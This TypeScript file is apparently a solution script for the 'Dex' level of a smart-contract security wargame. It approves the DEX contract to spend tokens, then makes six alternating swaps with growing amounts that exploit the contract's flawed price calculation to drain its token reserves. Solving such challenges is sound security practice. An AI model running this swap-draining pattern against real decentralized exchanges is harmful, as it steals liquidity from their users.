import { Dex } from '../../typechain-types';
import { EthereumClient } from '../ethereum/ethereum-client';
import { Attacker } from './attacker-provider';

export const DEX_LEVEL_NAME = "Dex"

export const dexAttacker = (): Attacker => {
    return {
        attack: async (ethereum: EthereumClient, instanceAddress: string) => {
          const dex = await ethereum.getContract<Dex>('Dex', instanceAddress);

          const token1 = await dex.token1();
          const token2 = await dex.token2();

          console.log('Approving dex to spend player tokens');
          const approveTx = await dex.approve(instanceAddress, 500);
          await approveTx.wait();

          console.log('Swapping 1')
          const swapTx1 = await dex.swap(token1, token2, 10);
          await swapTx1.wait();
          console.log('Swapping 2')
          const swapTx2 = await dex.swap(token2, token1, 20);
          await swapTx2.wait();
          console.log('Swapping 3')
          const swapTx3 = await dex.swap(token1, token2, 24);
          await swapTx3.wait();
          console.log('Swapping 4')
          const swapTx4 = await dex.swap(token2, token1, 30);
          await swapTx4.wait();
          console.log('Swapping 5')
          const swapTx5 = await dex.swap(token1, token2, 41);
          await swapTx5.wait();
          console.log('Swapping 6')
          const swapTx6 = await dex.swap(token2, token1, 45);
          await swapTx6.wait();
        }
    }
}